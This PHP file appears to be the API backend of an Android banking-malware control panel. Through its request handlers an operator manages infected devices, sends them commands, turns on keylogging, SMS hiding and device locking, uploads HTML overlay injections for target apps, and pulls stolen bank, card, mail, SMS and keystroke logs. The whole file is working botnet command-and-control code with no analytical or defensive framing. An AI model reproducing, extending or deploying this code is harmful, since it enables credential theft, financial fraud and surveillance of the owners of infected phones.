<?php

/*DATABASE*/

$restapi = new restapi();
$restapi->main(base64_decode(htmlspecialchars(isset($_POST["params"]) ? $_POST["params"] : "")));

class restapi{
	function main($params){
		include "db.php";
		$database = new database(); 
		$params = json_decode($params);
		switch($params->request){
			case "getBotsFull": 
			// '{"request":"getBotsFull","idbot":"123123"}'
				echo $database->getBotsFull($params->idbot);
				break;
			case "getBots": 
			// '{"request":"getBots","currentPage":"1","sorting":"0101010","botsperpage":"6"}'
				echo $database->getBots($params->currentPage, isset($params->sorting) ? $params->sorting : "0000000", $params->botsperpage);
				break;
			case "deleteBots": 
			// '{"request":"deleteBots","idbot":"idbot1,idbot2,.."}'    
				echo $database->deleteBots($params->idbot);
				break;
			case "mainStats": 
			// '{"request":"mainStats"}'
				echo $database->mainStats();
				break;
			case "botsSetCommand": 
			// '{"request":"botsSetCommand","idbot":"idbot1,idbot2,..","command":"base64_encode("command")"}'
			    echo $database->setCommand($params->idbot, $params->command);
				break;
			case "editComment": 
			// '{"request":"editComment","idbot":"123124","comment":"base64_encode("comment")"}'
			    echo $database->editComment($params->idbot, $params->comment);
				break;
			case "editGlobalSettings": 
			// '{"request":"editGlobalSettings","arrayUrl":"урл1,урл2,урл3","timeInject":"10","timeCC":"20","timeMail":"30","timeProtect":"50","updateTableBots":"5","pushTitle":"title","pushText":"text"}'
			    echo $database->editGlobalSettings($params->arrayUrl,$params->timeInject,$params->timeCC,$params->timeMail,$params->timeProtect, $params->updateTableBots, $params->pushTitle, $params->pushText);
				break;
			case "getGlobalSettings": 
			// '{"request":"getGlobalSettings"}'
			    echo $database->getGlobalSettings();
				break;
			case "editBotSettings": 
			// '{"request":"editBotSettings","idbot":"123123","hideSMS":"1","lockDevice":"1","offSound":"1","keylogger":"1","activeInjection":":inj1:inj2"}'
				echo $database->editBotSettings($params->idbot,$params->hideSMS,$params->lockDevice,$params->offSound,$params->keylogger,$params->activeInjection);
				break;
			case "getBotSettings": 
			// '{"request":"getBotSettings","idbot":"123123"}'
				echo $database->getBotSettings($params->idbot);
				break;
			case "getLogsBank": 
			// '{"request":"getLogsBank","idbot":"123123"}' OR '{"request":"getLogsBank"}'
				if(isset($params->idbot)){
					echo $database->getLogsInjections("logsBank",$params->idbot);
				}else{
					echo $database->getLogsInjections("logsBank",null);
				}
				break;
			case "getLogsCC": 
			// '{"request":"getLogsCC","idbot":"123123"}' OR {"request":"getLogsCC"}'
				if(isset($params->idbot)){
					echo $database->getLogsInjections("logsCC",$params->idbot);
				}else{
					echo $database->getLogsInjections("logsCC",null);
				}
				break;
			case "getLogsMail": 
			// '{"request":"getLogsMail","idbot":"123123"}' OR '{"request":"getLogsMail"}'
				if(isset($params->idbot)){
					echo $database->getLogsInjections("logsMail",$params->idbot);
				}else{
					echo $database->getLogsInjections("logsMail",null);
				}
				break;
			case "editCommentLogsBank": 
			// '{"request":"editCommentLogsBank","idinj":"qweqweqwe","comment":""}'
				echo $database->editCommentLogsInjections("logsBank",$params->idinj,$params->comment);
				break;
			case "editCommentLogsCC": 
			// '{"request":"editCommentLogsCC","idinj":"qweqweqwe","comment":""}'
				echo $database->editCommentLogsInjections("logsCC",$params->idinj,$params->comment);
				break;
			case "editCommentLogsMail": 
			// '{"request":"editCommentLogsMail","idinj":"qweqweqwe","comment":""}'
				echo $database->editCommentLogsInjections("logsMail",$params->idinj,$params->comment);
				break;
			case "deleteLogsBank": 
			// '{"request":"deleteLogsBank","idinj":"asdasdasd"}'
				echo $database->deleteLogsInjections("logsBank",$params->idinj);
				break;
			case "deleteLogsCC": 
			// '{"request":"deleteLogsCC","idinj":"asdasdasd"}'
				echo $database->deleteLogsInjections("logsCC",$params->idinj);
				break;
			case "deleteLogsMail": 
			// '{"request":"deleteLogsMail","idinj":"asdasdasd"}'
				echo $database->deleteLogsInjections("logsMail",$params->idinj);
				break;
			case "getHtmlInjection": 
			// '{"request":"getHtmlInjection"}'
				echo $database->getHtmlInjection();
				break;
			case "addHtmlInjection": 
			// '{"request":"addHtmlInjection","app":"","html":"","icon":""}'
				echo $database->addHtmlInjection($params->app, $params->html, $params->icon);
				break;
			case "deleteHtmlInjection": 
			// '{"request":"deleteHtmlInjection","app":""}'
				echo $database->deleteHtmlInjection($params->app);
				break;
			case "getLogsSMS": 
			// '{"request":"getLogsSMS","idbot":""}'
				echo $database->getLogsSMS($params->idbot);
				break;
			case "deleteLogsSMS": 
			// '{"request":"deleteLogsSMS","idbot":""}'
				echo $database->deleteTable('LogsSMS_'.$params->idbot);
				break;
			case "getLogsKeylogger": 
			// '{"request":"getLogsKeylogger","idbot":""}'
				echo $database->getLogsKeylogger($params->idbot);
				break;
			case "deleteLogsKeylogger": 
			// '{"request":"deleteLogsKeylogger","idbot":""}'
				echo $database->deleteTable('keylogger_'.$params->idbot);
				break;
			case "getLogsBotsSmsSaved":
			// '{"request":"getLogsBotsSmsSaved","idbot":""}'
				echo $database->getLogsBots("logsBotsSMS",$params->idbot);
				break;
			case "deleteLogsBotsSmsSaved":
			// '{"request":"deleteLogsBotsSmsSaved","idbot":""}'
				echo $database->delLogsBots("logsBotsSMS",$params->idbot);
				break;
			case "getlogsListApplications":
			// '{"request":"getlogsListApplications","idbot":""}'
				echo $database->getLogsBots("logsListApplications",$params->idbot);
				break;
			case "dellogsListApplications":
			// '{"request":"dellogsListApplications","idbot":""}'
				echo $database->delLogsBots("logsListApplications",$params->idbot);
				break;
			case "getlogsPhoneNumber":
			// '{"request":"getlogsPhoneNumber","idbot":""}'
				echo $database->getLogsBots("logsPhoneNumber",$params->idbot);
				break;
			case "deletelogsPhoneNumber":
			// '{"request":"deletelogsPhoneNumber","idbot":""}'
				echo $database->delLogsBots("logsPhoneNumber",$params->idbot);
				break;


			default:
				echo '{"error":"msg"}';
		}
	}
}



?>
